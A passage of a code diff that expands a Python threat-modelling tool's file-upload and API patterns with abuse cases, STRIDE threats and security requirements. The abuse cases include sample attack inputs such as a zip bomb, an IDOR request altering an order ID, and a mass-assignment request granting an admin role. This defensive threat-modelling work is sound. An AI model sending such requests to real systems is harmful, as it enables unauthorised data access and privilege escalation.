+                            "Log all file operations with original and sanitized filenames"
+                        ]
+                    },
+                    {
+                        "title": "Denial of Service via Resource Exhaustion",
+                        "description": "• RECONNAISSANCE: Attacker identifies file upload endpoints and size limits\n• WEAPONIZATION: Creates scripts to upload maximum-size files repeatedly or uses zip bombs\n• DELIVERY: Floods upload endpoint with large files or specially crafted archives\n• EXPLOITATION: Exhausts disk space, memory (during processing), or bandwidth\n• TECHNICAL DETAILS: Upload 10GB file repeatedly; or 42.zip (zip bomb) that expands to 4.5 petabytes\n• IMPACT: Service unavailability, storage costs, processing delays for legitimate users\n• BUSINESS IMPACT: Downtime, SLA violations, infrastructure costs",
+                        "threat_actor": "External Attacker / Competitor",
+                        "impact": "High",
+                        "likelihood": "Medium",
+                        "stride_category": "Denial of Service",
+                        "mitigations": [
+                            "Implement strict file size limits (e.g., 10MB) enforced at web server level",
+                            "Use streaming upload processing to reject oversized files early",
+                            "Implement per-user and per-IP upload quotas",
+                            "Detect and reject archive bombs by limiting decompression ratio",
+                            "Use separate storage volume for uploads with quota limits",
+                            "Implement rate limiting on upload endpoints"
+                        ]
                     }
                 ],
                 "stride_threats": {
-                    "T": [{"threat": "Malicious file execution", "mitigation": "Validate file types, scan for malware"}],
-                    "D": [{"threat": "Storage exhaustion via large uploads", "mitigation": "Implement file size limits"}]
+                    "T": [{"threat": "Malicious file execution or system file overwrite via path traversal", "mitigation": "Magic byte validation, server-generated filenames, canonical path checks"}],
+                    "D": [{"threat": "Storage/resource exhaustion via large or malicious uploads", "mitigation": "Size limits, quotas, zip bomb detection"}],
+                    "E": [{"threat": "Remote code execution via web shell upload", "mitigation": "Store outside web root, no execute permissions, malware scanning"}]
                 },
                 "requirements": [
-                    {"category": "Input Validation", "requirement": "Validate file types using magic bytes, not just extension", "priority": "must"},
-                    {"category": "Input Validation", "requirement": "Scan uploaded files for malware", "priority": "should"},
-                    {"category": "Input Validation", "requirement": "Limit file upload size", "priority": "must"}
+                    {
+                        "category": "Input Validation",
+                        "requirement": "Validate file types using magic bytes and content inspection",
+                        "priority": "Critical",
+                        "rationale": "• File extension and MIME type can be trivially spoofed by attackers\n• Magic bytes (file signatures) provide reliable file type identification\n• CWE-434 (Unrestricted Upload of File with Dangerous Type)\n• OWASP ASVS V12.1.1 requires file type validation",
+                        "acceptance_criteria": "• File type validated by reading first bytes and comparing to known signatures\n• Whitelist of allowed file types enforced (not blacklist)\n• Content inspection performed for complex formats (images re-encoded)\n• Automated tests verify dangerous file types are rejected"
+                    },
+                    {
+                        "category": "Input Validation",
+                        "requirement": "Implement malware scanning on all uploaded files",
+                        "priority": "High",
+                        "rationale": "• Uploaded files may contain malware that affects other users or systems\n• Defense in depth against novel file-based attacks\n• CWE-434 mitigation\n• Required for handling user-generated content at scale",
+                        "acceptance_criteria": "• All uploads scanned with antivirus (ClamAV or commercial solution)\n• Infected files quarantined and logged\n• Scan results available within acceptable latency\n• Signature database updated automatically"
+                    },
+                    {
+                        "category": "Input Validation",
+                        "requirement": "Enforce file size limits and upload quotas",
+                        "priority": "High",
+                        "rationale": "• Prevents denial of service via storage exhaustion\n• CWE-400 (Uncontrolled Resource Consumption)\n• Protects infrastructure costs and performance\n• OWASP ASVS V12.1.2 requires size limits",
+                        "acceptance_criteria": "• Maximum file size enforced at web server level (10MB default)\n• Per-user storage quota implemented and enforced\n• Oversized uploads rejected before full transfer completes\n• Archive bomb detection rejects files with high compression ratio"
+                    },
+                    {
+                        "category": "Data Protection",
+                        "requirement": "Store uploaded files outside web root with restricted access",
+                        "priority": "Critical",
+                        "rationale": "• Prevents direct execution of uploaded malicious scripts\n• Defense in depth against file type validation bypass\n• CWE-434 mitigation\n• OWASP ASVS V12.3.1 requires secure file storage",
+                        "acceptance_criteria": "• Upload directory is outside document root\n• Files served through application handler, not direct URL\n• No execute permissions on upload directory\n• Files served with Content-Disposition: attachment header"
+                    }
                 ],
-                "risk_factor": {"factor": "File Upload", "score": 20, "description": "Feature allows file uploads"}
+                "risk_factor": {"factor": "File Upload", "score": 25, "description": "Feature allows file uploads - high risk for RCE"}
             })
 
         # API patterns
         api_keywords = ["api", "endpoint", "rest", "graphql", "webhook"]
         if any(kw in text for kw in api_keywords):
             patterns.append({
+                "abuse_cases": [
+                    {
+                        "title": "Broken Object Level Authorization (BOLA/IDOR)",
+                        "description": "• RECONNAISSANCE: Attacker analyzes API responses to identify object ID patterns (sequential IDs, UUIDs)\n• WEAPONIZATION: Creates script to enumerate object IDs or manipulate IDs in requests\n• DELIVERY: Modifies API request: GET /api/users/123/orders to GET /api/users/124/orders\n• EXPLOITATION: Accesses other users' data by changing resource identifiers\n• TECHNICAL DETAILS: API returns data based on ID without verifying requestor owns that resource\n• IMPACT: Mass data exposure, privacy violations, access to sensitive records\n• BUSINESS IMPACT: GDPR/CCPA violations, customer data breach, regulatory fines",
+                        "threat_actor": "External Attacker / Malicious User",
+                        "impact": "Critical",
+                        "likelihood": "High",
+                        "stride_category": "Information Disclosure",
+                        "mitigations": [
+                            "Implement object-level authorization checks on every API endpoint",
+                            "Use indirect references (user-specific mapping) instead of direct database IDs",
+                            "Verify resource ownership against authenticated user context",
+                            "Use UUIDs instead of sequential IDs to prevent enumeration",
+                            "Implement automated BOLA testing in CI/CD pipeline",
+                            "Log and alert on access pattern anomalies"
+                        ]
+                    },
+                    {
+                        "title": "API Rate Limiting Bypass and Abuse",
+                        "description": "• RECONNAISSANCE: Attacker tests rate limits by sending requests at increasing rates\n• WEAPONIZATION: Identifies bypass techniques: rotating IPs, API key cycling, header manipulation\n• DELIVERY: Launches distributed attack from multiple IPs or exploits rate limit per-endpoint gaps\n• EXPLOITATION: Overwhelms API with requests causing DoS, or performs mass data scraping\n• TECHNICAL DETAILS: 10,000 requests/minute from botnet; or scrapes entire user database via pagination\n• IMPACT: Service degradation, infrastructure costs, competitive data theft\n• BUSINESS IMPACT: SLA violations, customer impact, increased cloud costs",
+                        "threat_actor": "External Attacker / Competitor / Automated Bot",
+                        "impact": "High",
+                        "likelihood": "High",
+                        "stride_category": "Denial of Service",
+                        "mitigations": [
+                            "Implement tiered rate limiting: per-IP, per-user, per-API-key, global",
+                            "Use token bucket or sliding window algorithms for rate limiting",
+                            "Deploy API gateway with DDoS protection (AWS API Gateway, Cloudflare)",
+                            "Implement request signing to prevent replay attacks",
+                            "Monitor and alert on unusual traffic patterns",
+                            "Use CAPTCHA for sensitive operations after threshold"
+                        ]
+                    },
+                    {
+                        "title": "Mass Assignment / Excessive Data Exposure",
+                        "description": "• RECONNAISSANCE: Attacker examines API responses for unexpected data fields\n• WEAPONIZATION: Adds additional fields to POST/PUT requests to modify protected attributes\n• DELIVERY: Sends request with extra fields: PUT /api/users/me {\"name\": \"John\", \"role\": \"admin\", \"balance\": 999999}\n• EXPLOITATION: Modifies fields not intended to be user-controllable (role, permissions, balance)\n• TECHNICAL DETAILS: API blindly binds request body to database model without filtering\n• IMPACT: Privilege escalation, data tampering, financial fraud\n• BUSINESS IMPACT: Unauthorized access, data integrity issues, compliance violations",
+                        "threat_actor": "External Attacker / Malicious User",
+                        "impact": "High",
+                        "likelihood": "Medium",
+                        "stride_category": "Tampering",
+                        "mitigations": [
+                            "Define explicit allowlist of fields that can be modified per endpoint",
+                            "Use DTOs/schemas that only include intended fields (Pydantic, Marshmallow)",
+                            "Never bind request body directly to database models",
+                            "Remove sensitive fields from API responses (password hash, internal IDs)",
+                            "Implement field-level authorization for sensitive attributes",
+                            "Document and test all API fields with security review"
+                        ]
+                    }
+                ],
                 "stride_threats": {
-                    "S": [{"threat": "API key theft or spoofing", "mitigation": "Implement proper API authentication"}],
-                    "D": [{"threat": "API abuse causing service degradation", "mitigation": "Implement rate limiting"}]
+                    "S": [{"threat": "API key theft, JWT forgery, or authentication bypass", "mitigation": "Secure key storage, short-lived tokens, proper JWT validation"}],
+                    "I": [{"threat": "Excessive data exposure in API responses or BOLA attacks", "mitigation": "Response filtering, object-level authorization, minimal data principle"}],
+                    "D": [{"threat": "API abuse causing service degradation or cost explosion", "mitigation": "Multi-layer rate limiting, API gateway, DDoS protection"}]
                 },
                 "requirements": [
-                    {"category": "Authentication", "requirement": "Implement API authentication (OAuth2/API keys)", "priority": "must"},
-                    {"category": "Authorization", "requirement": "Implement rate limiting on API endpoints", "priority": "must"},
-                    {"category": "Logging", "requirement": "Log all API calls with authentication context", "priority": "should"}
+                    {
+                        "category": "Authentication",
+                        "requirement": "Implement secure API authentication using OAuth 2.0 or JWT",
+                        "priority": "Critical",
+                        "rationale": "• APIs are primary attack surface for modern applications\n• OWASP API Security Top 10 - API2:2023 Broken Authentication\n• JWT must be properly validated (signature, expiry, issuer, audience)\n• API keys should be rotatable and have minimal scope",
+                        "acceptance_criteria": "• All API endpoints require authentication except explicitly public ones\n• JWT validation includes signature, expiry, issuer, and audience checks\n• API keys are hashed in storage, rotatable, and audited\n• Authentication failures return generic errors (no user enumeration)"
+                    },
+                    {
+                        "category": "Authorization",
+                        "requirement": "Implement object-level authorization on all data access endpoints",
+                        "priority": "Critical",
+                        "rationale": "• BOLA/IDOR is #1 API vulnerability (OWASP API Top 10 2023)\n• Every request must verify user has access to requested resource\n• CWE-639 (Authorization Bypass Through User-Controlled Key)\n• Cannot rely solely on authentication - authorization is separate concern",
+                        "acceptance_criteria": "• Every endpoint verifies resource ownership before returning data\n• Automated BOLA tests in CI/CD pipeline\n• Access denied for resources not owned by authenticated user\n• Audit log captures all authorization decisions"
+                    },
+                    {
+                        "category": "Rate Limiting",
+                        "requirement": "Implement multi-layer API rate limiting with adaptive thresholds",
+                        "priority": "High",
+                        "rationale": "• Prevents DoS, brute force, and scraping attacks\n• OWASP API Security Top 10 - API4:2023 Unrestricted Resource Consumption\n• Protects infrastructure costs and availability\n• CWE-770 (Allocation of Resources Without Limits)",
+                        "acceptance_criteria": "• Rate limits enforced per-IP, per-user, and per-API-key\n• Limits documented in API specification\n• 429 responses include Retry-After header\n• Anomaly detection alerts on unusual patterns"
+                    },
+                    {
+                        "category": "Logging",
+                        "requirement": "Comprehensive API request/response logging with security context",
+                        "priority": "High",
+                        "rationale": "• Essential for incident detection and forensic analysis\n• OWASP API Top 10 - API9:2023 Improper Inventory Management\n• Required for compliance (PCI-DSS, SOC2)\n• Enables threat hunting and anomaly detection",
+                        "acceptance_criteria": "• All API calls logged with timestamp, user, IP, endpoint, response code\n• Sensitive data redacted from logs (passwords, tokens, PII)\n• Logs forwarded to SIEM with alerting rules\n• Log retention meets compliance requirements"
+                    }
                 ],
-                "risk_factor": {"factor": "API Exposure", "score": 15, "description": "Feature exposes API endpoints"}
+                "risk_factor": {"factor": "API Exposure", "score": 20, "description": "Feature exposes API endpoints - significant attack surface"}
             })
 
         return patterns
